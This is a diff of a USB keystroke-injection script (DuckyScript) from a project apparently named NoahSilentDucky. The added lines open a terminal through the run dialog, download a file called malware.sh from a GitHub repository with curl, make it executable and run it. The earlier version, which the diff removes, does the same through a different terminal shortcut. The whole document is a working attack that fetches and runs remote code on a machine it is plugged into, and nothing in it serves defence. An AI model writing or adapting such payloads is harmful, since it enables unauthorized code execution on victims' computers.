@@ -1,12 +1,14 @@
-DELAY 2000
-CTRL ALT T
 DELAY 500
-STRING curl -o /tmp/malware.sh https://raw.githubusercontent.com/noahlgrd01/NoahSilentDucky/main/malware.sh
+GUI r
+DELAY 500
+STRING gnome-terminal
 ENTER
-DELAY 2000
+DELAY 1000
+STRING curl -L https://github.com/noahlgrd01/NoahSilentDucky/raw/main/malware.sh -o /tmp/malware.sh
+ENTER
+DELAY 000
 STRING chmod +x /tmp/malware.sh
 ENTER
 DELAY 500
-REM Exécuter le script
 STRING /tmp/malware.sh
-ENTER 
+ENTER
